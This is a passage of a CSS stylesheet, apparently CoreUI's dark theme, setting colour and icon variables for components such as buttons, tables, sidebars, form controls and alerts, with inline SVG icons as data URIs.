                --cui-primary-stop: #2d2587;
                --cui-secondary-start: #d1d2d3;
                --cui-secondary-stop: white;
                --cui-success-start: #45a164;
                --cui-success-stop: #2e8c47;
                --cui-info-start: #4799eb;
                --cui-info-stop: #4280b4;
                --cui-warning-start: #e1a82d;
                --cui-warning-stop: #dd9124;
                --cui-danger-start: #d16767;
                --cui-danger-stop: #c14f4f;
                --cui-light-start: #e8e8e8;
                --cui-light-stop: white;
                --cui-dark-start: #4c4f54;
                --cui-dark-stop: #292a2b;
            }
            .dark-theme .accordion {
                --cui-accordion-button-color: rgba(255, 255, 255, 0.87);
                --cui-accordion-button-bg: transparent;
                --cui-accordion-bg: transparent;
                --cui-accordion-color: rgba(255, 255, 255, 0.87);
                --cui-accordion-border-color: rgba(255, 255, 255, 0.125);
                --cui-accordion-button-active-bg: rgba(150, 143, 211, 0.525);
                --cui-accordion-button-active-color: #e6e6e6;
                --cui-accordion-button-focus-border-color: rgba(255, 255, 255, 0.2);
                --cui-accordion-button-icon: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba(255, 255, 255, 0.87)'><path fill-rule='evenodd' d='M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z'/></svg>");
                --cui-accordion-button-active-icon: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba(255, 255, 255, 0.87)'><path fill-rule='evenodd' d='M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z'/></svg>");
            }
            .dark-theme .breadcrumb {
                --cui-breadcrumb-divider-color: rgba(255, 255, 255, 0.87);
                --cui-breadcrumb-active-color: rgba(255, 255, 255, 0.6);
            }
            .dark-theme .btn-close {
                --cui-btn-close-color: rgba(255, 255, 255, 0.87);
                --cui-btn-close-bg: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba(255, 255, 255, 0.87)'><path d='M.293.293a1 1 0 011.414 0L8 6.586 14.293.293a1 1 0 111.414 1.414L9.414 8l6.293 6.293a1 1 0 01-1.414 1.414L8 9.414l-6.293 6.293a1 1 0 01-1.414-1.414L6.586 8 .293 1.707a1 1 0 010-1.414z'/></svg>");
            }
            .dark-theme .btn-link {
                --cui-btn-link-color: #948dd2;
                --cui-btn-link-hover-color: #a9a4db;
                --cui-btn-link-disabled-color: rgba(255, 255, 255, 0.38);
            }
            .dark-theme .calendar {
                --cui-calendar-nav-border: 1px solid rgba(255, 255, 255, 0.075);
                --cui-calendar-nav-date-color: rgba(255, 255, 255, 0.87);
                --cui-calendar-nav-date-hover-color: #857dcc;
                --cui-calendar-cell-header-inner-color: rgba(255, 255, 255, 0.6);
                --cui-calendar-cell-hover-bg: rgba(0, 0, 21, 0.25);
                --cui-calendar-cell-disabled-color: rgba(255, 255, 255, 0.38);
                --cui-calendar-cell-selected-bg: #857dcc;
                --cui-calendar-cell-range-bg: #a49ed9;
                --cui-calendar-cell-range-hover-bg: #948dd2;
                --cui-calendar-cell-range-hover-border-color: #857dcc;
            }
            .dark-theme .date-picker {
                --cui-date-picker-timepicker-border-top: 1px solid rgba(255, 255, 255, 0.075);
            }
            .dark-theme .card {
                --cui-card-bg: #24252f;
                --cui-card-border-color: rgba(255, 255, 255, 0.075);
                --cui-card-cap-bg: #282933;
            }
            .dark-theme .dropdown-menu {
                --cui-dropdown-color: rgba(255, 255, 255, 0.87);
                --cui-dropdown-border-color: rgba(255, 255, 255, 0.075);
                --cui-dropdown-bg: #34353e;
                --cui-dropdown-divider-bg: rgba(255, 255, 255, 0.075);
                --cui-dropdown-link-color: rgba(255, 255, 255, 0.87);
                --cui-dropdown-link-hover-color: rgba(255, 255, 255, 0.87);
                --cui-dropdown-link-hover-bg: #3b3c45;
                --cui-dropdown-link-active-color: #fff;
                --cui-dropdown-link-active-bg: #857dcc;
                --cui-dropdown-link-disabled-color: rgba(255, 255, 255, 0.6);
                --cui-dropdown-header-color: rgba(255, 255, 255, 0.87);
            }
            .dark-theme .footer {
                --cui-footer-bg: #2a2b36;
                --cui-footer-color: rgba(255, 255, 255, 0.87);
                --cui-footer-border-width: 0;
                --cui-footer-border-color: transparent;
            }
            .dark-theme .form-control {
                --cui-input-color: rgba(255, 255, 255, 0.87);
                --cui-input-bg: rgba(255, 255, 255, 0.05);
                --cui-input-border-color: rgba(255, 255, 255, 0.09);
                --cui-input-focus-color: rgba(255, 255, 255, 0.87);
                --cui-input-focus-bg: rgba(255, 255, 255, 0.05);
                --cui-input-focus-border-color: rgba(255, 255, 255, 0.2);
                --cui-input-disabled-bg: rgba(0, 0, 21, 0.1);
                --cui-input-placeholder-color: rgba(255, 255, 255, 0.6);
                --cui-input-plaintext-color: rgba(255, 255, 255, 0.87);
                --cui-form-text-color: rgba(255, 255, 255, 0.6);
            }
            .dark-theme .form-check {
                --cui-form-check-input-checked-color: #fff;
                --cui-form-check-input-checked-bg-color: #857dcc;
                --cui-form-check-input-checked-border-color: #857dcc;
            }
            .dark-theme .form-select {
                --cui-form-select-color: rgba(255, 255, 255, 0.87);
                --cui-form-select-bg: rgba(255, 255, 255, 0.05);
                --cui-form-select-border-color: rgba(255, 255, 255, 0.09);
                --cui-form-select-focus-border-color: rgba(255, 255, 255, 0.2);
                --cui-form-select-disabled-bg: rgba(0, 0, 21, 0.1);
            }
            .dark-theme .form-multi-select {
                --cui-form-multi-select-color: rgba(255, 255, 255, 0.87);
                --cui-form-multi-select-bg: rgba(255, 255, 255, 0.05);
                --cui-form-multi-select-border-color: rgba(255, 255, 255, 0.09);
                --cui-form-multi-select-disabled-color: rgba(255, 255, 255, 0.38);
                --cui-form-multi-select-disabled-bg: rgba(0, 0, 21, 0.1);
                --cui-form-multi-select-focus-color: rgba(255, 255, 255, 0.87);
                --cui-form-multi-select-focus-bg: rgba(255, 255, 255, 0.05);
                --cui-form-multi-select-focus-border-color: rgba(255, 255, 255, 0.2);
                --cui-form-multi-select-tag-bg: rgba(255, 255, 255, 0.1);
                --cui-form-multi-select-tag-border-color: rgba(255, 255, 255, 0.09);
                --cui-form-multi-select-search-color: rgba(255, 255, 255, 0.87);
                --cui-form-multi-select-search-bg: transparent;
                --cui-form-multi-select-search-border-color: rgba(255, 255, 255, 0.09);
                --cui-form-multi-select-cleaner-bg: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba(255, 255, 255, 0.6)'><path d='M.293.293a1 1 0 011.414 0L8 6.586 14.293.293a1 1 0 111.414 1.414L9.414 8l6.293 6.293a1 1 0 01-1.414 1.414L8 9.414l-6.293 6.293a1 1 0 01-1.414-1.414L6.586 8 .293 1.707a1 1 0 010-1.414z'/></svg>");
                --cui-form-multi-select-cleaner-hover-bg: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba(255, 255, 255, 0.87)'><path d='M.293.293a1 1 0 011.414 0L8 6.586 14.293.293a1 1 0 111.414 1.414L9.414 8l6.293 6.293a1 1 0 01-1.414 1.414L8 9.414l-6.293 6.293a1 1 0 01-1.414-1.414L6.586 8 .293 1.707a1 1 0 010-1.414z'/></svg>");
                --cui-form-multi-select-cleaner-focus-bg: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba(255, 255, 255, 0.87)'><path d='M.293.293a1 1 0 011.414 0L8 6.586 14.293.293a1 1 0 111.414 1.414L9.414 8l6.293 6.293a1 1 0 01-1.414 1.414L8 9.414l-6.293 6.293a1 1 0 01-1.414-1.414L6.586 8 .293 1.707a1 1 0 010-1.414z'/></svg>");
                --cui-form-multi-select-cleaner-border-color: rgba(255, 255, 255, 0.09);
                --cui-form-multi-select-select-all-color: rgba(255, 255, 255, 0.6);
                --cui-form-multi-select-select-all-bg: transparent;
                --cui-form-multi-select-select-all-hover-color: rgba(255, 255, 255, 0.87);
                --cui-form-multi-select-select-all-hover-bg: transparent;
                --cui-form-multi-select-select-all-border-color: rgba(255, 255, 255, 0.09);
                --cui-form-multi-select-options-color: rgba(255, 255, 255, 0.87);
                --cui-form-multi-select-options-bg: #34353e;
                --cui-form-multi-select-options-border-color: rgba(255, 255, 255, 0.09);
                --cui-form-multi-select-option-hover-color: rgba(255, 255, 255, 0.87);
                --cui-form-multi-select-option-hover-bg: rgba(255, 255, 255, 0.1);
                --cui-form-multi-select-option-selected-bg: rgba(255, 255, 255, 0.1);
            }
            .dark-theme .header {
                --cui-header-bg: #2a2b36;
                --cui-header-color: rgba(255, 255, 255, 0.75);
                --cui-header-hover-color: rgba(255, 255, 255, 0.9);
                --cui-header-active-color: #fff;
                --cui-header-disabled-color: rgba(255, 255, 255, 0.25);
                --cui-header-brand-color: #fff;
                --cui-header-brand-hover-color: #fff;
                --cui-header-toggler-color: rgba(255, 255, 255, 0.75);
                --cui-header-toggler-hover-color: #fff;
                --cui-header-toggler-icon-bg: url("data:image/svg+xml;charset=utf8,%3Csvg viewBox='0 0 30 30' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath stroke='rgba(255, 255, 255, 0.75)' stroke-width='2.25' stroke-linecap='round' stroke-miterlimit='10' d='M4 7h22M4 15h22M4 23h22'/%3E%3C/svg%3E");
                --cui-header-toggler-hover-icon-bg: url("data:image/svg+xml;charset=utf8,%3Csvg viewBox='0 0 30 30' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath stroke='rgba(255, 255, 255, 0.9)' stroke-width='2.25' stroke-linecap='round' stroke-miterlimit='10' d='M4 7h22M4 15h22M4 23h22'/%3E%3C/svg%3E");
                --cui-header-toggler-border-color: rgba(255, 255, 255, 0.1);
                --cui-header-divider-border-color: rgba(255, 255, 255, 0.1);
            }
            .dark-theme .dark\:header-header-border,
            .dark-theme .header-header-border:not([class*="dark:"]) {
                --cui-header-bottom: 0;
            }
            .dark-theme .input-group {
                --cui-input-group-addon-color: rgba(255, 255, 255, 0.87);
                --cui-input-group-addon-bg: rgba(255, 255, 255, 0.09);
                --cui-input-group-addon-border-color: rgba(255, 255, 255, 0.09);
            }
            .dark-theme .list-group {
                --cui-list-group-color: rgba(255, 255, 255, 0.87);
                --cui-list-group-bg: transparent;
                --cui-list-group-border-color: rgba(255, 255, 255, 0.075);
                --cui-list-group-hover-bg: rgba(255, 255, 255, 0.1);
                --cui-list-group-active-color: #fff;
                --cui-list-group-active-bg: #857dcc;
                --cui-list-group-active-border-color: #857dcc;
                --cui-list-group-disabled-color: rgba(255, 255, 255, 0.5);
                --cui-list-group-disabled-bg: rgba(255, 255, 255, 0.8);
                --cui-list-group-action-color: rgba(255, 255, 255, 0.87);
                --cui-list-group-action-hover-color: rgba(255, 255, 255, 0.87);
                --cui-list-group-action-active-color: rgba(255, 255, 255, 0.87);
                --cui-list-group-action-active-bg: #4f5d73;
            }

            .dark-theme .nav {
                --cui-nav-link-disabled-color: rgba(255, 255, 255, 0.38);
                --cui-nav-pills-link-active-bg: #857dcc;
                --cui-nav-pills-link-active-color: #fff;
                --cui-nav-tabs-border-color: rgba(255, 255, 255, 0.075);
                --cui-nav-tabs-link-active-bg: rgba(255, 255, 255, 0.075);
                --cui-nav-tabs-link-active-color: rgba(255, 255, 255, 0.87);
                --cui-nav-tabs-link-active-border-color: transparent;
                --cui-nav-tabs-link-hover-border-color: rgba(255, 255, 255, 0.075) rgba(255, 255, 255, 0.075) rgba(255, 255, 255, 0.075);
                --cui-nav-underline-border-color: rgba(255, 255, 255, 0.075);
                --cui-nav-underline-link-color: rgba(255, 255, 255, 0.6);
                --cui-nav-underline-link-active-color: #857dcc;
                --cui-nav-underline-link-active-border-color: #857dcc;
            }
            .dark-theme .offcanvas {
                --cui-offcanvas-bg-color: #383943;
                --cui-offcanvas-border-color: transparent;
            }
            .dark-theme .pagination {
                --cui-pagination-color: #948dd2;
                --cui-pagination-bg: transparent;
                --cui-pagination-border-color: rgba(255, 255, 255, 0.075);
                --cui-pagination-focus-color: #a9a4db;
                --cui-pagination-focus-bg: rgba(255, 255, 255, 0.075);
                --cui-pagination-hover-color: #a9a4db;
                --cui-pagination-hover-bg: rgba(255, 255, 255, 0.075);
                --cui-pagination-hover-border-color: rgba(255, 255, 255, 0.075);
                --cui-pagination-active-color: #fff;
                --cui-pagination-active-bg-dt: #857dcc;
                --cui-pagination-active-border-color: #857dcc;
                --cui-pagination-disabled-color: rgba(255, 255, 255, 0.38);
                --cui-pagination-disabled-bg: transparent;
                --cui-pagination-disabled-border-color: rgba(255, 255, 255, 0.075);
            }
            .dark-theme .picker {
                --cui-input-bg: rgba(255, 255, 255, 0.05);
                --cui-input-group-addon-border-color: transparent;
                --cui-picker-footer-border-top: 1px solid rgba(255, 255, 255, 0.075);
            }
            .dark-theme .popover {
                --cui-popover-bg: #3b3c45;
                --cui-popover-border-color: rgba(255, 255, 255, 0.075);
                --cui-popover-header-bg: #3b3c45;
                --cui-popover-header-color: rgba(255, 255, 255, 0.87);
                --cui-popover-body-color: rgba(255, 255, 255, 0.87);
                --cui-popover-arrow-color: #3b3c45;
                --cui-popover-arrow-outer-color: rgba(255, 255, 255, 0.125);
            }
            .dark-theme .progress {
                --cui-progress-bg: rgba(255, 255, 255, 0.2);
                --cui-progress-bar-bg: #857dcc;
                --cui-progress-bar-color: #fff;
            }
            .dark-theme .sidebar {
                --cui-sidebar-color: rgba(255, 255, 255, 0.87);
                --cui-sidebar-bg: #2a2b36;
                --cui-sidebar-border-width: 0;
                --cui-sidebar-border-color: transparent;
                --cui-sidebar-brand-color: inherit;
                --cui-sidebar-brand-bg: rgba(0, 0, 21, 0.2);
                --cui-sidebar-footer-bg: rgba(0, 0, 21, 0.2);
                --cui-sidebar-header-bg: rgba(0, 0, 21, 0.2);
                --cui-sidebar-toggler-bg: rgba(0, 0, 21, 0.2);
                --cui-sidebar-toggler-hover-bg: rgba(0, 0, 21, 0.3);
                --cui-sidebar-nav-title-color: rgba(255, 255, 255, 0.6);
                --cui-sidebar-nav-link-color: rgba(255, 255, 255, 0.6);
                --cui-sidebar-nav-link-bg: transparent;
                --cui-sidebar-nav-link-icon-color: rgba(255, 255, 255, 0.6);
                --cui-sidebar-nav-link-hover-color: rgba(255, 255, 255, 0.87);
                --cui-sidebar-nav-link-hover-bg: rgba(255, 255, 255, 0.05);
                --cui-sidebar-nav-link-hover-icon-color: rgba(255, 255, 255, 0.87);
                --cui-sidebar-nav-link-active-color: rgba(255, 255, 255, 0.87);
                --cui-sidebar-nav-link-active-bg: rgba(255, 255, 255, 0.05);
                --cui-sidebar-nav-link-active-icon-color: rgba(255, 255, 255, 0.87);
                --cui-sidebar-nav-link-disabled-color: rgba(255, 255, 255, 0.38);
                --cui-sidebar-nav-link-disabled-icon-color: rgba(255, 255, 255, 0.6);
                --cui-sidebar-nav-group-bg: rgba(0, 0, 0, 0.2);
                --cui-sidebar-nav-group-toggle-show-color: rgba(255, 255, 255, 0.6);
                --cui-sidebar-nav-group-indicator-color: rgba(255, 255, 255, 0.6);
                --cui-sidebar-nav-group-indicator-icon: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba(255, 255, 255, 0.6)'><path fill-rule='evenodd' d='M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z'/></svg>");
                --cui-sidebar-nav-group-indicator-hover-color: rgba(255, 255, 255, 0.87);
                --cui-sidebar-nav-group-indicator-hover-icon: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' fill='rgba(255, 255, 255, 0.87)'><path fill-rule='evenodd' d='M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z'/></svg>");
            }
            .dark-theme .table {
                --cui-table-color: rgba(255, 255, 255, 0.87);
                --cui-table-bg: transparent;
                --cui-table-border-color: rgba(255, 255, 255, 0.075);
                --cui-table-striped-color: rgba(255, 255, 255, 0.87);
                --cui-table-striped-bg: rgba(255, 255, 255, 0.05);
                --cui-table-active-color: rgba(255, 255, 255, 0.87);
                --cui-table-active-bg: rgba(0, 0, 21, 0.1);
                --cui-table-hover-color: rgba(255, 255, 255, 0.87);
                --cui-table-hover-bg: rgba(0, 0, 21, 0.075);
            }
            .dark-theme .dark\:table-primary,
            .dark-theme .table-primary:not([class*="dark:"]) {
                --cui-table-bg: #e7e5f5;
                --cui-table-color: rgba(44, 56, 74, 0.95);
                --cui-table-border-color: rgba(214, 213, 229, 0.995);
                --cui-table-striped-bg: rgba(223, 221, 237, 0.9975);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(214, 213, 229, 0.995);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(218, 217, 233, 0.99625);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
            }
            .dark-theme .dark\:table-secondary,
            .dark-theme .table-secondary:not([class*="dark:"]) {
                --cui-table-bg: #ededed;
                --cui-table-color: rgba(44, 56, 74, 0.95);
                --cui-table-border-color: rgba(219, 220, 222, 0.995);
                --cui-table-striped-bg: rgba(228, 229, 230, 0.9975);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(219, 220, 222, 0.995);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(224, 225, 226, 0.99625);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
            }
            .dark-theme .dark\:table-success,
            .dark-theme .table-success:not([class*="dark:"]) {
                --cui-table-bg: #dceae1;
                --cui-table-color: rgba(44, 56, 74, 0.95);
                --cui-table-border-color: rgba(204, 218, 211, 0.995);
                --cui-table-striped-bg: rgba(212, 226, 218, 0.9975);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(204, 218, 211, 0.995);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(208, 222, 215, 0.99625);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
            }
            .dark-theme .dark\:table-info,
            .dark-theme .table-info:not([class*="dark:"]) {
                --cui-table-bg: #dcebf9;
                --cui-table-color: rgba(44, 56, 74, 0.95);
                --cui-table-border-color: rgba(204, 219, 233, 0.995);
                --cui-table-striped-bg: rgba(212, 227, 241, 0.9975);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(204, 219, 233, 0.995);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(208, 223, 237, 0.99625);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
            }
            .dark-theme .dark\:table-warning,
            .dark-theme .table-warning:not([class*="dark:"]) {
                --cui-table-bg: #f7edd7;
                --cui-table-color: rgba(44, 56, 74, 0.95);
                --cui-table-border-color: rgba(228, 220, 202, 0.995);
                --cui-table-striped-bg: rgba(238, 229, 209, 0.9975);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(228, 220, 202, 0.995);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(233, 225, 205, 0.99625);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
            }
            .dark-theme .dark\:table-danger,
            .dark-theme .table-danger:not([class*="dark:"]) {
                --cui-table-bg: #f4e3e3;
                --cui-table-color: rgba(44, 56, 74, 0.95);
                --cui-table-border-color: rgba(226, 211, 213, 0.995);
                --cui-table-striped-bg: rgba(235, 219, 220, 0.9975);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(226, 211, 213, 0.995);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(230, 215, 217, 0.99625);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
            }
            .dark-theme .dark\:table-light,
            .dark-theme .table-light:not([class*="dark:"]) {
                --cui-table-bg: rgba(255, 255, 255, 0.1);
                --cui-table-color: rgba(255, 255, 255, 0.87);
                --cui-table-border-color: rgba(255, 255, 255, 0.177);
                --cui-table-striped-bg: rgba(255, 255, 255, 0.1385);
                --cui-table-striped-color: rgba(44, 56, 74, 0.95);
                --cui-table-active-bg: rgba(255, 255, 255, 0.177);
                --cui-table-active-color: rgba(44, 56, 74, 0.95);
                --cui-table-hover-bg: rgba(255, 255, 255, 0.15775);
                --cui-table-hover-color: rgba(44, 56, 74, 0.95);
            }
            .dark-theme .dark\:table-dark,
            .dark-theme .table-dark:not([class*="dark:"]) {
                --cui-table-bg: rgba(0, 0, 21, 0.1);
                --cui-table-color: rgba(255, 255, 255, 0.87);
                --cui-table-border-color: rgba(118, 118, 129, 0.177);
                --cui-table-striped-bg: rgba(74, 74, 88, 0.1385);
                --cui-table-striped-color: rgba(255, 255, 255, 0.87);
                --cui-table-active-bg: rgba(118, 118, 129, 0.177);
                --cui-table-active-color: #000015;
                --cui-table-hover-bg: rgba(98, 98, 111, 0.15775);
                --cui-table-hover-color: rgba(255, 255, 255, 0.87);
            }
            .dark-theme .time-picker {
                --cui-time-picker-roll-col-border: 1px solid rgba(255, 255, 255, 0.075);
            }

            .dark-theme .alert-primary .alert-link {
                color: #180f69;
            }
            .dark-theme .alert-secondary {
                --cui-alert-color: #5e636a;
                --cui-alert-bg: #ebedef;
                --cui-alert-border-color: #e2e4e8;
            }
            .dark-theme .alert-secondary .alert-link {
                color: #4b4f55;
            }
            .dark-theme .alert-success {
                --cui-alert-color: #1c6e37;
                --cui-alert-bg: #d5f1de;
                --cui-alert-border-color: #c0eace;
            }
            .dark-theme .alert-success .alert-link {
                color: #16582c;
            }
            .dark-theme .alert-danger {
                --cui-alert-color: #893232;
                --cui-alert-bg: #fadddd;
                --cui-alert-border-color: #f7cbcb;
            }
            .dark-theme .alert-danger .alert-link {
                color: #6e2828;
            }
            .dark-theme .alert-warning {
                --cui-alert-color: rgba(131, 107, 52, 0.97);
                --cui-alert-bg: #feefd0;
                --cui-alert-border-color: #fde8b9;
            }
            .dark-theme .alert-warning .alert-link {
                color: rgba(104, 85, 41, 0.976);
            }
            .dark-theme .alert-info {
                --cui-alert-color: #1f5c99;
                --cui-alert-bg: #d6ebff;
                --cui-alert-border-color: #c2e0ff;
            }
            .dark-theme .alert-info .alert-link {
                color: #194a7a;
            }
            .dark-theme .btn-primary {
                --cui-btn-color: #000015;
                --cui-btn-bg: #857dcc;
                --cui-btn-border-color: #857dcc;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #9791d4;
                --cui-btn-hover-border-color: #918ad1;
                --cui-btn-focus-shadow-rgb: 113, 106, 177;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #9d97d6;
                --cui-btn-active-border-color: #918ad1;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #000015;
                --cui-btn-disabled-bg: #857dcc;
                --cui-btn-disabled-border-color: #857dcc;
            }
            .dark-theme .btn-secondary {
                --cui-btn-color: rgba(44, 56, 74, 0.95);
                --cui-btn-bg: #a7a7a7;
                --cui-btn-border-color: #a7a7a7;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #8e8e8e;
                --cui-btn-hover-border-color: #868686;
                --cui-btn-focus-shadow-rgb: 150, 152, 154;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #868686;
                --cui-btn-active-border-color: #7d7d7d;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: rgba(44, 56, 74, 0.95);
                --cui-btn-disabled-bg: #a7a7a7;
                --cui-btn-disabled-border-color: #a7a7a7;
            }
            .dark-theme .btn-success {
                --cui-btn-color: #000015;
                --cui-btn-bg: #519668;
                --cui-btn-border-color: #519668;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #6ba67f;
                --cui-btn-hover-border-color: #62a177;
                --cui-btn-focus-shadow-rgb: 69, 128, 92;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #74ab86;
                --cui-btn-active-border-color: #62a177;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #000015;
                --cui-btn-disabled-bg: #519668;
                --cui-btn-disabled-border-color: #519668;
            }
            .dark-theme .btn-danger {
                --cui-btn-color: #000015;
                --cui-btn-bg: #c77171;
                --cui-btn-border-color: #c77171;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #cf8686;
                --cui-btn-hover-border-color: #cd7f7f;
                --cui-btn-focus-shadow-rgb: 169, 96, 99;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #d28d8d;
                --cui-btn-active-border-color: #cd7f7f;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #000015;
                --cui-btn-disabled-bg: #c77171;
                --cui-btn-disabled-border-color: #c77171;
            }
            .dark-theme .btn-warning {
                --cui-btn-color: rgba(44, 56, 74, 0.95);
                --cui-btn-bg: #d5a439;
                --cui-btn-border-color: #d5a439;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #b58b30;
                --cui-btn-hover-border-color: #aa832e;
                --cui-btn-focus-shadow-rgb: 190, 149, 59;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #aa832e;
                --cui-btn-active-border-color: #a07b2b;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: rgba(44, 56, 74, 0.95);
                --cui-btn-disabled-bg: #d5a439;
                --cui-btn-disabled-border-color: #d5a439;
            }
            .dark-theme .btn-info {
                --cui-btn-color: #000015;
                --cui-btn-bg: #5299e0;
                --cui-btn-border-color: #5299e0;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #6ca8e5;
                --cui-btn-hover-border-color: #63a3e3;
                --cui-btn-focus-shadow-rgb: 70, 130, 194;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #75ade6;
                --cui-btn-active-border-color: #63a3e3;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #000015;
                --cui-btn-disabled-bg: #5299e0;
                --cui-btn-disabled-border-color: #5299e0;
            }
            .dark-theme .btn-outline-primary {
                --cui-btn-color: #857dcc;
                --cui-btn-border-color: #857dcc;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #9d97d6;
                --cui-btn-hover-border-color: #918ad1;
                --cui-btn-focus-shadow-rgb: 133, 125, 204;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #9d97d6;
                --cui-btn-active-border-color: #918ad1;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #857dcc;
                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .dark-theme .btn-outline-secondary {
                --cui-btn-color: #a7a7a7;
                --cui-btn-border-color: #a7a7a7;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #868686;
                --cui-btn-hover-border-color: #7d7d7d;
                --cui-btn-focus-shadow-rgb: 167, 167, 167;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #868686;
                --cui-btn-active-border-color: #7d7d7d;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #a7a7a7;
                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .dark-theme .btn-outline-success {
                --cui-btn-color: #519668;
                --cui-btn-border-color: #519668;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #74ab86;
                --cui-btn-hover-border-color: #62a177;
                --cui-btn-focus-shadow-rgb: 81, 150, 104;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #74ab86;
                --cui-btn-active-border-color: #62a177;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #519668;
                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .dark-theme .btn-outline-danger {
                --cui-btn-color: #c77171;
                --cui-btn-border-color: #c77171;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #d28d8d;
                --cui-btn-hover-border-color: #cd7f7f;
                --cui-btn-focus-shadow-rgb: 199, 113, 113;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #d28d8d;
                --cui-btn-active-border-color: #cd7f7f;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #c77171;
                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .dark-theme .btn-outline-warning {
                --cui-btn-color: #d5a439;
                --cui-btn-border-color: #d5a439;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #aa832e;
                --cui-btn-hover-border-color: #a07b2b;
                --cui-btn-focus-shadow-rgb: 213, 164, 57;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #aa832e;
                --cui-btn-active-border-color: #a07b2b;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #d5a439;
